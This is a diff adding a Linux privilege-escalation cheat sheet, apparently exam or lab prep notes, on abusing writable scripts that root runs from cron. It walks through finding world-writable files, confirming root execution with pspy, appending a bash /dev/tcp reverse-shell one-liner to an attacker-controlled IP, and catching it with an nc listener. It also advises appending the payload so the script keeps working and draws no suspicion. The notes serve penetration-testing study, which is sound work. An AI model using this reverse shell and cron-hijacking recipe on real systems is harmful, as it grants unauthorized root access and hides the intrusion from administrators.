@@ -1,0 +1,145 @@
+🧠 Summary: What’s Happening?
+A cron job is a scheduled task executed by the system. If that cron job executes a script or binary:
+
+And that file is world-writable or owned by the current user, and...
+
+That cron job is run as root...
+
+You can inject your own code (like a reverse shell) into the script and escalate to root.
+
+📌 Got This? Do That (ITTT)
+🎯 Goal: Escalate to root via misconfigured cron jobs.
+✅ Got This:
+You’re a low-privilege user on a Linux system
+
+You want to check for scheduled tasks (cronjobs) that run as root
+
+🔍 Do This:
+🔹 Step 1: Identify Writable Scripts Likely Run by Cron
+bash
+Copy
+Edit
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+Look for scripts like /etc/cron.*, /dmz-backups/*.sh, /var/spool/cron/*, etc.
+
+🔹 Step 2: Look for Evidence That the File is Cron-Triggered
+Look at file timestamps or see output files generated consistently (e.g., every 3 min).
+
+If unsure, run:
+
+bash
+Copy
+Edit
+./pspy64 -pf -i 1000
+Look for something like:
+
+text
+Copy
+Edit
+/bin/bash /dmz-backups/backup.sh
+🔹 Step 3: Confirm Script is Run by Root (UID=0)
+text
+Copy
+Edit
+CMD: UID=0    PID=XXXX   | /bin/bash /path/to/script.sh
+If root is running this, and you have write access — jackpot.
+
+🚀 Now What?
+🔹 Step 4: Backup and Modify the Script
+bash
+Copy
+Edit
+cp /dmz-backups/backup.sh /tmp/backup_original.sh
+nano /dmz-backups/backup.sh
+Append your reverse shell one-liner at the bottom:
+
+bash
+Copy
+Edit
+bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+Tip: Use /dev/tcp/ over nc since it’s often available without imports.
+
+🔹 Step 5: Setup Listener
+bash
+Copy
+Edit
+nc -lnvp 443
+Wait for the cron to trigger. Reverse shell as root incoming.
+
+💡 One-Liner Pattern to Remember
+If you're scripting this out in an exam box where you confirmed a vulnerable cron script:
+
+bash
+Copy
+Edit
+echo 'bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1' >> /path/to/writable/script.sh
+nc -lnvp YOURPORT
+🧨 Extra Abuse Paths to Check
+/etc/cron.d/ → Sometimes world-writable files
+
+/etc/cron.daily/, cron.hourly/ → Common place to drop malicious scripts
+
+Scripts owned by root but writable by you
+
+If found, check ls -la, then check who runs it with pspy.
+
+🧠 Tips for Exam/Real-World
+This works even if you can't read crontab entries. If a file gets updated regularly and it's world-writable, it's likely cron-driven.
+
+Don't overwrite the whole script unless you know what you're doing. Always append your payload to preserve functionality and avoid suspicion.
+
+Use pspy early in every privilege escalation phase — it's gold for uncovering timed/root-executed processes.
+
+✅ crontab -l – What It Does
+🔹 As a non-root user:
+bash
+Copy
+Edit
+crontab -l
+➡️ Lists your user’s personal cron jobs (from /var/spool/cron/crontabs/youruser).
+
+If you have a cronjob running as you, like:
+
+ruby
+Copy
+Edit
+*/10 * * * * /home/buck/backup.sh
+It will show up here. Not helpful for root escalation, unless you see paths/scripts you can exploit further.
+
+🔹 As root:
+bash
+Copy
+Edit
+sudo crontab -l
+➡️ Lists the root user’s cron jobs. This is where the real gold often is — reverse shells, log wipes, backups, scripts.
+
+🔥 Pro Move: Read System-Wide Cron Job Files Without crontab -l
+Even if you can’t run crontab -l as root, you can still enumerate system-wide cron jobs manually:
+
+Location	Purpose
+/etc/crontab	System-wide cron jobs for multiple users
+/etc/cron.d/	Drop-in style cronjobs
+/var/spool/cron/crontabs/*	User-specific cron entries
+/etc/cron.{daily,hourly,weekly,monthly}/	Scripts scheduled accordingly
+📌 Check:
+
+bash
+Copy
+Edit
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /var/spool/cron/crontabs/
+Then look for:
+
+World-writable scripts or logs
+
+Scripts being run as root but writable by you
+
+Misconfigured PATH-related entries
+
+🧠 TL;DR
+Command	Use Case
+crontab -l	See your cron jobs
+sudo crontab -l	See root's cron jobs
+cat /etc/crontab	Check system-wide jobs
+ls -la /etc/cron.*	Check for script misconfigs
